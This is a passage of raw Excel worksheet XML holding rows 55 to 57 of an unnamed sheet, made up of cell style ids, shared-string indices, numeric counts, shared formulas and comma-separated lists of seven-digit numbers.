        <v>1</v>
      </c>
      <c r="BS55" s="304">
        <v>2</v>
      </c>
      <c r="BT55" s="304">
        <v>1</v>
      </c>
      <c r="BU55" s="304">
        <v>3</v>
      </c>
      <c r="BV55" s="305">
        <v>1</v>
      </c>
      <c r="BW55" s="317">
        <v>80</v>
      </c>
      <c r="BX55" s="318">
        <v>77</v>
      </c>
      <c r="BY55" s="318" t="s">
        <v>990</v>
      </c>
      <c r="BZ55" s="318">
        <v>9</v>
      </c>
      <c r="CA55" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB55" s="318" t="s">
        <v>991</v>
      </c>
      <c r="CC55" s="318" t="s">
        <v>991</v>
      </c>
      <c r="CD55" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE55" s="318" t="str">
        <f t="shared" si="8"/>
        <v>2009815, 2009714, 2006446, 2006445, 2008538, 1061, -</v>
      </c>
      <c r="CF55" s="318" t="s">
        <v>992</v>
      </c>
      <c r="CG55" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH55" s="318">
        <v>6</v>
      </c>
      <c r="CI55" s="319">
        <v>77</v>
      </c>
      <c r="CJ55" s="319">
        <v>73</v>
      </c>
      <c r="CK55" s="319">
        <v>73</v>
      </c>
      <c r="CL55" s="319">
        <v>0</v>
      </c>
      <c r="CM55" s="319">
        <f t="shared" si="9"/>
        <v>73</v>
      </c>
      <c r="CN55" s="319">
        <v>75</v>
      </c>
      <c r="CO55" s="319">
        <v>74</v>
      </c>
      <c r="CP55" s="319">
        <v>3</v>
      </c>
      <c r="CQ55" s="319">
        <v>77</v>
      </c>
      <c r="CR55" s="319">
        <v>78</v>
      </c>
      <c r="CS55" s="320">
        <v>76</v>
      </c>
      <c r="CT55" s="339">
        <v>458</v>
      </c>
      <c r="CU55" s="340">
        <v>76</v>
      </c>
      <c r="CV55" s="340" t="s">
        <v>993</v>
      </c>
      <c r="CW55" s="340">
        <v>13</v>
      </c>
      <c r="CX55" s="340"/>
      <c r="CY55" s="340" t="s">
        <v>994</v>
      </c>
      <c r="CZ55" s="340" t="s">
        <v>995</v>
      </c>
      <c r="DA55" s="340">
        <v>50447</v>
      </c>
      <c r="DB55" s="340" t="str">
        <f t="shared" si="10"/>
        <v>2009815, 2009714, 2006446, 2006445, 2008538, 1061, 19779, 37070, -</v>
      </c>
      <c r="DC55" s="340" t="s">
        <v>996</v>
      </c>
      <c r="DD55" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE55" s="340">
        <v>8</v>
      </c>
      <c r="DF55" s="341">
        <v>77</v>
      </c>
      <c r="DG55" s="341">
        <v>73</v>
      </c>
      <c r="DH55" s="341">
        <v>73</v>
      </c>
      <c r="DI55" s="341">
        <v>0</v>
      </c>
      <c r="DJ55" s="341">
        <f t="shared" si="11"/>
        <v>73</v>
      </c>
      <c r="DK55" s="341">
        <v>75</v>
      </c>
      <c r="DL55" s="341">
        <v>75</v>
      </c>
      <c r="DM55" s="341">
        <v>228</v>
      </c>
      <c r="DN55" s="341">
        <v>77</v>
      </c>
      <c r="DO55" s="341">
        <v>296</v>
      </c>
      <c r="DP55" s="342">
        <v>76</v>
      </c>
      <c r="DQ55" s="355">
        <v>536</v>
      </c>
      <c r="DR55" s="356">
        <v>156</v>
      </c>
      <c r="DS55" s="356" t="s">
        <v>997</v>
      </c>
      <c r="DT55" s="356">
        <v>17</v>
      </c>
      <c r="DU55" s="356"/>
      <c r="DV55" s="356" t="s">
        <v>998</v>
      </c>
      <c r="DW55" s="356" t="s">
        <v>999</v>
      </c>
      <c r="DX55" s="356">
        <v>50447</v>
      </c>
      <c r="DY55" s="356" t="str">
        <f t="shared" si="12"/>
        <v>2101061, 2017808, 2009815, 2009714, 2006446, 2006445, 2008538, 1061, 19779, 7070, -</v>
      </c>
      <c r="DZ55" s="356" t="s">
        <v>1000</v>
      </c>
      <c r="EA55" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB55" s="356">
        <v>10</v>
      </c>
      <c r="EC55" s="357">
        <v>77</v>
      </c>
      <c r="ED55" s="357">
        <v>75</v>
      </c>
      <c r="EE55" s="357">
        <v>73</v>
      </c>
      <c r="EF55" s="357">
        <v>0</v>
      </c>
      <c r="EG55" s="357">
        <f t="shared" si="13"/>
        <v>73</v>
      </c>
      <c r="EH55" s="357">
        <v>78</v>
      </c>
      <c r="EI55" s="357">
        <v>75</v>
      </c>
      <c r="EJ55" s="357">
        <v>228</v>
      </c>
      <c r="EK55" s="357">
        <v>155</v>
      </c>
      <c r="EL55" s="357">
        <v>300</v>
      </c>
      <c r="EM55" s="358">
        <v>76</v>
      </c>
      <c r="EN55" s="368" t="str">
        <f t="shared" si="16"/>
        <v>SI</v>
      </c>
      <c r="EO55" s="369">
        <v>150</v>
      </c>
      <c r="EP55" s="369"/>
      <c r="EQ55" s="369" t="s">
        <v>1002</v>
      </c>
      <c r="ER55" s="369">
        <v>2</v>
      </c>
      <c r="ES55" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET55" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU55" s="369" t="s">
        <v>1002</v>
      </c>
      <c r="EV55" s="369"/>
      <c r="EW55" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX55" s="369"/>
      <c r="EY55" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ55" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA55" s="369"/>
      <c r="FB55" s="369"/>
      <c r="FC55" s="369">
        <v>77</v>
      </c>
      <c r="FD55" s="369">
        <f t="shared" si="15"/>
        <v>76</v>
      </c>
      <c r="FE55" s="369">
        <v>76</v>
      </c>
      <c r="FF55" s="369">
        <v>0</v>
      </c>
      <c r="FG55" s="369">
        <v>76</v>
      </c>
      <c r="FH55" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI55" s="377" t="str">
        <f t="shared" si="17"/>
        <v>SI</v>
      </c>
      <c r="FJ55" s="378">
        <v>265</v>
      </c>
      <c r="FK55" s="378"/>
      <c r="FL55" s="378" t="s">
        <v>1003</v>
      </c>
      <c r="FM55" s="378">
        <v>17</v>
      </c>
      <c r="FN55" s="378"/>
      <c r="FO55" s="378">
        <v>9999</v>
      </c>
      <c r="FP55" s="378" t="s">
        <v>1004</v>
      </c>
      <c r="FQ55" s="378"/>
      <c r="FR55" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS55" s="380"/>
      <c r="FT55" s="380"/>
      <c r="FU55" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV55" s="378"/>
      <c r="FW55" s="378"/>
      <c r="FX55" s="378">
        <v>77</v>
      </c>
      <c r="FY55" s="378">
        <f t="shared" si="20"/>
        <v>76</v>
      </c>
      <c r="FZ55" s="378">
        <v>76</v>
      </c>
      <c r="GA55" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB55" s="378">
        <v>76</v>
      </c>
      <c r="GC55" s="379" t="s">
        <v>12</v>
      </c>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c r="IW55" s="40"/>
      <c r="IX55" s="40"/>
      <c r="IY55" s="40"/>
      <c r="IZ55" s="40"/>
      <c r="JA55" s="40"/>
      <c r="JB55" s="40"/>
      <c r="JC55" s="40"/>
      <c r="JD55" s="40"/>
      <c r="JE55" s="40"/>
      <c r="JF55" s="40"/>
      <c r="JG55" s="40"/>
      <c r="JH55" s="40"/>
      <c r="JI55" s="40"/>
      <c r="JJ55" s="40"/>
      <c r="JK55" s="40"/>
      <c r="JL55" s="40"/>
      <c r="JM55" s="40"/>
      <c r="JN55" s="40"/>
      <c r="JO55" s="40"/>
      <c r="JP55" s="40"/>
      <c r="JQ55" s="40"/>
      <c r="JR55" s="40"/>
      <c r="JS55" s="40"/>
      <c r="JT55" s="40"/>
      <c r="JU55" s="40"/>
      <c r="JV55" s="40"/>
      <c r="JW55" s="40"/>
      <c r="JX55" s="40"/>
      <c r="JY55" s="40"/>
      <c r="JZ55" s="40"/>
      <c r="KA55" s="40"/>
      <c r="KB55" s="40"/>
      <c r="KC55" s="40"/>
      <c r="KD55" s="40"/>
      <c r="KE55" s="40"/>
      <c r="KF55" s="40"/>
      <c r="KG55" s="40"/>
      <c r="KH55" s="40"/>
      <c r="KI55" s="40"/>
      <c r="KJ55" s="40"/>
      <c r="KK55" s="40"/>
      <c r="KL55" s="40"/>
      <c r="KM55" s="40"/>
      <c r="KN55" s="40"/>
      <c r="KO55" s="40"/>
      <c r="KP55" s="40"/>
      <c r="KQ55" s="40"/>
      <c r="KR55" s="40"/>
      <c r="KS55" s="40"/>
      <c r="KT55" s="40"/>
      <c r="KU55" s="40"/>
      <c r="KV55" s="40"/>
      <c r="KW55" s="40"/>
      <c r="KX55" s="40"/>
      <c r="KY55" s="40"/>
      <c r="KZ55" s="40"/>
      <c r="LA55" s="40"/>
      <c r="LB55" s="40"/>
      <c r="LC55" s="40"/>
      <c r="LD55" s="40"/>
      <c r="LE55" s="40"/>
      <c r="LF55" s="40"/>
      <c r="LG55" s="40"/>
      <c r="LH55" s="40"/>
      <c r="LI55" s="40"/>
    </row>
    <row r="56" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B56" s="224" t="s">
        <v>562</v>
      </c>
      <c r="C56" s="225" t="s">
        <v>591</v>
      </c>
      <c r="D56" s="225" t="s">
        <v>564</v>
      </c>
      <c r="E56" s="225" t="s">
        <v>1005</v>
      </c>
      <c r="F56" s="225">
        <v>33</v>
      </c>
      <c r="G56" s="225" t="s">
        <v>1006</v>
      </c>
      <c r="H56" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I56" s="225"/>
      <c r="J56" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K56" s="227" t="s">
        <v>1007</v>
      </c>
      <c r="L56" s="228" t="s">
        <v>280</v>
      </c>
      <c r="M56" s="227" t="s">
        <v>1008</v>
      </c>
      <c r="N56" s="227" t="s">
        <v>1009</v>
      </c>
      <c r="O56" s="389" t="s">
        <v>2703</v>
      </c>
      <c r="P56" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q56" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R56" s="225"/>
      <c r="S56" s="396"/>
      <c r="T56" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U56" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V56" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W56" s="231"/>
      <c r="X56" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y56" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z56" s="256" t="s">
        <v>1011</v>
      </c>
      <c r="AA56" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB56" s="256" t="s">
        <v>2457</v>
      </c>
      <c r="AC56" s="226" t="s">
        <v>1012</v>
      </c>
      <c r="AD56" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE56" s="259" t="s">
        <v>1016</v>
      </c>
      <c r="AF56" s="270" t="s">
        <v>1013</v>
      </c>
      <c r="AG56" s="225" t="s">
        <v>1014</v>
      </c>
      <c r="AH56" s="273" t="s">
        <v>1015</v>
      </c>
      <c r="AI56" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ56" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK56" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL56" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM56" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN56" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO56" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP56" s="230"/>
      <c r="AQ56" s="230"/>
      <c r="AR56" s="288">
        <v>27</v>
      </c>
      <c r="AS56" s="288">
        <v>9</v>
      </c>
      <c r="AT56" s="288">
        <v>2</v>
      </c>
      <c r="AU56" s="288">
        <f t="shared" si="5"/>
        <v>11</v>
      </c>
      <c r="AV56" s="256" t="s">
        <v>1010</v>
      </c>
      <c r="AW56" s="288">
        <v>16</v>
      </c>
      <c r="AX56" s="288">
        <v>16</v>
      </c>
      <c r="AY56" s="288">
        <v>2</v>
      </c>
      <c r="AZ56" s="288">
        <f>AX56+AY56</f>
        <v>18</v>
      </c>
      <c r="BA56" s="289" t="s">
        <v>1027</v>
      </c>
      <c r="BB56" s="301">
        <v>8</v>
      </c>
      <c r="BC56" s="302">
        <v>0</v>
      </c>
      <c r="BD56" s="302">
        <v>1917</v>
      </c>
      <c r="BE56" s="302">
        <v>1</v>
      </c>
      <c r="BF56" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG56" s="302">
        <v>1917</v>
      </c>
      <c r="BH56" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI56" s="302">
        <v>1917</v>
      </c>
      <c r="BJ56" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK56" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL56" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM56" s="302">
        <v>0</v>
      </c>
      <c r="BN56" s="304">
        <v>119</v>
      </c>
      <c r="BO56" s="304">
        <v>2</v>
      </c>
      <c r="BP56" s="304">
        <v>0</v>
      </c>
      <c r="BQ56" s="304">
        <v>0</v>
      </c>
      <c r="BR56" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS56" s="304">
        <v>8</v>
      </c>
      <c r="BT56" s="304">
        <v>0</v>
      </c>
      <c r="BU56" s="304">
        <v>8</v>
      </c>
      <c r="BV56" s="305">
        <v>0</v>
      </c>
      <c r="BW56" s="317">
        <v>46</v>
      </c>
      <c r="BX56" s="318">
        <v>26</v>
      </c>
      <c r="BY56" s="318" t="s">
        <v>1017</v>
      </c>
      <c r="BZ56" s="318">
        <v>7</v>
      </c>
      <c r="CA56" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB56" s="318">
        <v>1917</v>
      </c>
      <c r="CC56" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD56" s="318" t="s">
        <v>1018</v>
      </c>
      <c r="CE56" s="318" t="str">
        <f t="shared" si="8"/>
        <v>2035480, 2025644, 2022858, 2016141, 2018959, -</v>
      </c>
      <c r="CF56" s="318" t="s">
        <v>1019</v>
      </c>
      <c r="CG56" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH56" s="318">
        <v>5</v>
      </c>
      <c r="CI56" s="319">
        <v>25</v>
      </c>
      <c r="CJ56" s="319">
        <v>12</v>
      </c>
      <c r="CK56" s="319">
        <v>9</v>
      </c>
      <c r="CL56" s="319">
        <v>0</v>
      </c>
      <c r="CM56" s="319">
        <f t="shared" si="9"/>
        <v>9</v>
      </c>
      <c r="CN56" s="319">
        <v>26</v>
      </c>
      <c r="CO56" s="319">
        <v>16</v>
      </c>
      <c r="CP56" s="319">
        <v>8</v>
      </c>
      <c r="CQ56" s="319">
        <v>38</v>
      </c>
      <c r="CR56" s="319">
        <v>46</v>
      </c>
      <c r="CS56" s="320">
        <v>16</v>
      </c>
      <c r="CT56" s="339">
        <v>54</v>
      </c>
      <c r="CU56" s="340">
        <v>26</v>
      </c>
      <c r="CV56" s="340" t="s">
        <v>1020</v>
      </c>
      <c r="CW56" s="340">
        <v>8</v>
      </c>
      <c r="CX56" s="340"/>
      <c r="CY56" s="340" t="s">
        <v>930</v>
      </c>
      <c r="CZ56" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA56" s="340" t="s">
        <v>1021</v>
      </c>
      <c r="DB56" s="340" t="str">
        <f t="shared" si="10"/>
        <v>2035480, 2025644, 2022858, 2016141, 2018959, -</v>
      </c>
      <c r="DC56" s="340" t="s">
        <v>1022</v>
      </c>
      <c r="DD56" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE56" s="340">
        <v>5</v>
      </c>
      <c r="DF56" s="341">
        <v>119</v>
      </c>
      <c r="DG56" s="341">
        <v>12</v>
      </c>
      <c r="DH56" s="341">
        <v>9</v>
      </c>
      <c r="DI56" s="341">
        <v>1</v>
      </c>
      <c r="DJ56" s="341">
        <f t="shared" si="11"/>
        <v>10</v>
      </c>
      <c r="DK56" s="341">
        <v>27</v>
      </c>
      <c r="DL56" s="341">
        <v>16</v>
      </c>
      <c r="DM56" s="341">
        <v>16</v>
      </c>
      <c r="DN56" s="341">
        <v>38</v>
      </c>
      <c r="DO56" s="341">
        <v>54</v>
      </c>
      <c r="DP56" s="342">
        <v>16</v>
      </c>
      <c r="DQ56" s="355">
        <v>91</v>
      </c>
      <c r="DR56" s="356">
        <v>30</v>
      </c>
      <c r="DS56" s="356" t="s">
        <v>1023</v>
      </c>
      <c r="DT56" s="356">
        <v>16</v>
      </c>
      <c r="DU56" s="356"/>
      <c r="DV56" s="356" t="s">
        <v>1024</v>
      </c>
      <c r="DW56" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX56" s="356" t="s">
        <v>1025</v>
      </c>
      <c r="DY56" s="356" t="str">
        <f t="shared" si="12"/>
        <v>2035480, 2000419, 2025644, 2022858, 2003595, 2018959
, -</v>
      </c>
      <c r="DZ56" s="356" t="s">
        <v>1026</v>
      </c>
      <c r="EA56" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB56" s="356">
        <v>7</v>
      </c>
      <c r="EC56" s="357">
        <v>25</v>
      </c>
      <c r="ED56" s="357">
        <v>14</v>
      </c>
      <c r="EE56" s="357">
        <v>9</v>
      </c>
      <c r="EF56" s="357">
        <v>0</v>
      </c>
      <c r="EG56" s="357">
        <f t="shared" si="13"/>
        <v>9</v>
      </c>
      <c r="EH56" s="357">
        <v>41</v>
      </c>
      <c r="EI56" s="357">
        <v>16</v>
      </c>
      <c r="EJ56" s="357">
        <v>16</v>
      </c>
      <c r="EK56" s="357">
        <v>75</v>
      </c>
      <c r="EL56" s="357">
        <v>91</v>
      </c>
      <c r="EM56" s="358">
        <v>16</v>
      </c>
      <c r="EN56" s="368" t="str">
        <f t="shared" si="16"/>
        <v>SI</v>
      </c>
      <c r="EO56" s="369">
        <v>2</v>
      </c>
      <c r="EP56" s="369"/>
      <c r="EQ56" s="369">
        <v>12449</v>
      </c>
      <c r="ER56" s="369">
        <v>1</v>
      </c>
      <c r="ES56" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET56" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU56" s="369">
        <v>12449</v>
      </c>
      <c r="EV56" s="369"/>
      <c r="EW56" s="369" t="s">
        <v>1028</v>
      </c>
      <c r="EX56" s="369"/>
      <c r="EY56" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ56" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA56" s="369"/>
      <c r="FB56" s="369"/>
      <c r="FC56" s="369">
        <v>117</v>
      </c>
      <c r="FD56" s="369">
        <f t="shared" si="15"/>
        <v>8</v>
      </c>
      <c r="FE56" s="369">
        <v>0</v>
      </c>
      <c r="FF56" s="369">
        <v>8</v>
      </c>
      <c r="FG56" s="369">
        <v>10</v>
      </c>
      <c r="FH56" s="370" t="s">
        <v>1029</v>
      </c>
      <c r="FI56" s="377" t="str">
        <f t="shared" si="17"/>
        <v>SI</v>
      </c>
      <c r="FJ56" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK56" s="378"/>
      <c r="FL56" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM56" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN56" s="378"/>
      <c r="FO56" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP56" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ56" s="378"/>
      <c r="FR56" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS56" s="380"/>
      <c r="FT56" s="380"/>
      <c r="FU56" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV56" s="378"/>
      <c r="FW56" s="378"/>
      <c r="FX56" s="378">
        <v>20</v>
      </c>
      <c r="FY56" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ56" s="378">
        <v>0</v>
      </c>
      <c r="GA56" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB56" s="378">
        <v>0</v>
      </c>
      <c r="GC56" s="379" t="s">
        <v>1030</v>
      </c>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c r="IW56" s="40"/>
      <c r="IX56" s="40"/>
      <c r="IY56" s="40"/>
      <c r="IZ56" s="40"/>
      <c r="JA56" s="40"/>
      <c r="JB56" s="40"/>
      <c r="JC56" s="40"/>
      <c r="JD56" s="40"/>
      <c r="JE56" s="40"/>
      <c r="JF56" s="40"/>
      <c r="JG56" s="40"/>
      <c r="JH56" s="40"/>
      <c r="JI56" s="40"/>
      <c r="JJ56" s="40"/>
      <c r="JK56" s="40"/>
      <c r="JL56" s="40"/>
      <c r="JM56" s="40"/>
      <c r="JN56" s="40"/>
      <c r="JO56" s="40"/>
      <c r="JP56" s="40"/>
      <c r="JQ56" s="40"/>
      <c r="JR56" s="40"/>
      <c r="JS56" s="40"/>
      <c r="JT56" s="40"/>
      <c r="JU56" s="40"/>
      <c r="JV56" s="40"/>
      <c r="JW56" s="40"/>
      <c r="JX56" s="40"/>
      <c r="JY56" s="40"/>
      <c r="JZ56" s="40"/>
      <c r="KA56" s="40"/>
      <c r="KB56" s="40"/>
      <c r="KC56" s="40"/>
      <c r="KD56" s="40"/>
      <c r="KE56" s="40"/>
      <c r="KF56" s="40"/>
      <c r="KG56" s="40"/>
      <c r="KH56" s="40"/>
      <c r="KI56" s="40"/>
      <c r="KJ56" s="40"/>
      <c r="KK56" s="40"/>
      <c r="KL56" s="40"/>
      <c r="KM56" s="40"/>
      <c r="KN56" s="40"/>
      <c r="KO56" s="40"/>
      <c r="KP56" s="40"/>
      <c r="KQ56" s="40"/>
      <c r="KR56" s="40"/>
      <c r="KS56" s="40"/>
      <c r="KT56" s="40"/>
      <c r="KU56" s="40"/>
      <c r="KV56" s="40"/>
      <c r="KW56" s="40"/>
      <c r="KX56" s="40"/>
      <c r="KY56" s="40"/>
      <c r="KZ56" s="40"/>
      <c r="LA56" s="40"/>
      <c r="LB56" s="40"/>
      <c r="LC56" s="40"/>
      <c r="LD56" s="40"/>
      <c r="LE56" s="40"/>
      <c r="LF56" s="40"/>
      <c r="LG56" s="40"/>
      <c r="LH56" s="40"/>
      <c r="LI56" s="40"/>
    </row>
    <row r="57" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B57" s="224" t="s">
        <v>860</v>
      </c>
      <c r="C57" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D57" s="225" t="s">
        <v>861</v>
      </c>
      <c r="E57" s="225" t="s">
        <v>1031</v>
      </c>
      <c r="F57" s="225">
        <v>34</v>
      </c>
      <c r="G57" s="225" t="s">
        <v>1032</v>
      </c>
      <c r="H57" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I57" s="225"/>
      <c r="J57" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K57" s="227" t="s">
        <v>1033</v>
      </c>
      <c r="L57" s="228" t="s">
        <v>1034</v>
      </c>
      <c r="M57" s="227" t="s">
        <v>1034</v>
      </c>
      <c r="N57" s="227" t="s">
        <v>1035</v>
      </c>
      <c r="O57" s="389" t="s">
        <v>2704</v>
      </c>
      <c r="P57" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q57" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R57" s="225"/>
      <c r="S57" s="396"/>
      <c r="T57" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U57" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V57" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W57" s="231"/>
      <c r="X57" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y57" s="255" t="s">
        <v>236</v>
      </c>
      <c r="Z57" s="256" t="s">
        <v>1036</v>
      </c>
      <c r="AA57" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB57" s="256" t="s">
        <v>2458</v>
      </c>
      <c r="AC57" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD57" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE57" s="259" t="s">
        <v>1040</v>
      </c>
      <c r="AF57" s="270" t="s">
        <v>1037</v>
      </c>
      <c r="AG57" s="225" t="s">
        <v>1038</v>
      </c>
      <c r="AH57" s="271" t="s">
        <v>1039</v>
      </c>
      <c r="AI57" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ57" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK57" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL57" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM57" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN57" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO57" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP57" s="230"/>
      <c r="AQ57" s="230"/>
      <c r="AR57" s="288">
        <v>18</v>
      </c>
      <c r="AS57" s="288">
        <v>3</v>
      </c>
      <c r="AT57" s="288">
        <v>0</v>
      </c>
      <c r="AU57" s="288">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="AV57" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW57" s="288">
        <v>2</v>
      </c>
      <c r="AX57" s="288">
        <v>2</v>
      </c>
      <c r="AY57" s="288">
        <v>0</v>
      </c>
      <c r="AZ57" s="288">
        <f>AX57+AY57</f>
        <v>2</v>
      </c>
      <c r="BA57" s="289" t="s">
        <v>1051</v>
      </c>
      <c r="BB57" s="301">
        <v>2</v>
      </c>
      <c r="BC57" s="302">
        <v>0</v>
      </c>
      <c r="BD57" s="302">
        <v>1448</v>
      </c>
      <c r="BE57" s="302">
        <v>1</v>
      </c>
      <c r="BF57" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG57" s="302">
        <v>1448</v>
      </c>
      <c r="BH57" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI57" s="302">
        <v>1448</v>
      </c>
      <c r="BJ57" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK57" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL57" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM57" s="302">
        <v>0</v>
      </c>
      <c r="BN57" s="304">
        <v>18</v>
      </c>
      <c r="BO57" s="304">
        <v>2</v>
      </c>
      <c r="BP57" s="304">
        <v>0</v>
      </c>
      <c r="BQ57" s="304">
        <v>0</v>
      </c>
      <c r="BR57" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS57" s="304">
        <v>2</v>
      </c>
      <c r="BT57" s="304">
        <v>0</v>
      </c>
      <c r="BU57" s="304">
        <v>2</v>
      </c>
      <c r="BV57" s="305">
        <v>0</v>
      </c>
      <c r="BW57" s="317">
        <v>4</v>
      </c>
      <c r="BX57" s="318">
        <v>0</v>
      </c>
      <c r="BY57" s="318" t="s">
        <v>1041</v>
      </c>
      <c r="BZ57" s="318">
        <v>2</v>
      </c>
      <c r="CA57" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB57" s="318" t="s">
        <v>1042</v>
      </c>
      <c r="CC57" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD57" s="318" t="s">
        <v>1043</v>
      </c>
      <c r="CE57" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF57" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG57" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH57" s="318">
        <v>0</v>
      </c>
      <c r="CI57" s="319">
        <v>17</v>
      </c>
      <c r="CJ57" s="319">
        <v>4</v>
      </c>
      <c r="CK57" s="319">
        <v>0</v>
      </c>
      <c r="CL57" s="319">
        <v>0</v>
      </c>
      <c r="CM57" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN57" s="319">
        <v>4</v>
      </c>
      <c r="CO57" s="319">
        <v>0</v>
      </c>
      <c r="CP57" s="319">
        <v>2</v>
      </c>
      <c r="CQ57" s="319">
        <v>2</v>
      </c>
      <c r="CR57" s="319">
        <v>4</v>
      </c>
      <c r="CS57" s="320">
        <v>0</v>
      </c>
      <c r="CT57" s="339">
        <v>4</v>
      </c>
      <c r="CU57" s="340">
        <v>0</v>
      </c>
      <c r="CV57" s="340" t="s">
        <v>1044</v>
      </c>
      <c r="CW57" s="340">
        <v>2</v>
      </c>
      <c r="CX57" s="340"/>
      <c r="CY57" s="340" t="s">
        <v>1045</v>
      </c>
      <c r="CZ57" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA57" s="340" t="s">
        <v>1046</v>
      </c>
      <c r="DB57" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC57" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD57" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE57" s="340">
        <v>0</v>
      </c>
      <c r="DF57" s="341">
        <v>18</v>
      </c>
      <c r="DG57" s="341">
        <v>4</v>
      </c>
      <c r="DH57" s="341">
        <v>0</v>
      </c>
      <c r="DI57" s="341">
        <v>0</v>
      </c>
      <c r="DJ57" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK57" s="341">
        <v>4</v>
      </c>
      <c r="DL57" s="341">
        <v>0</v>
      </c>
      <c r="DM57" s="341">
        <v>2</v>
      </c>
      <c r="DN57" s="341">
        <v>2</v>
      </c>
      <c r="DO57" s="341">
        <v>4</v>
      </c>
      <c r="DP57" s="342">
        <v>0</v>
      </c>
      <c r="DQ57" s="355">
        <v>18</v>
      </c>
      <c r="DR57" s="356">
        <v>2</v>
      </c>
      <c r="DS57" s="356" t="s">
        <v>1047</v>
      </c>
      <c r="DT57" s="356">
        <v>12</v>
      </c>
      <c r="DU57" s="356"/>
      <c r="DV57" s="356" t="s">
        <v>1048</v>
      </c>
